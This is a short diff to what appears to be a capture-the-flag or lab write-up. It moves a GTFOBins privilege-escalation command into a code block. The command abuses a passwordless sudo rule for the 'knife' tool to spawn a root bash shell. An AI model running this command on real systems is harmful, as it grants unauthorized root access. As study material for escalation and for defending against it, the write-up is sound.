@@ -32,4 +32,7 @@ $ sudo -l
     (root) NOPASSWD: /usr/bin/knife
 ```
 
-GTFOBins: sudo knife exec -E 'exec "/bin/bash"'
+GTFOBins:
+```sh
+sudo knife exec -E 'exec "/bin/bash"'
+```
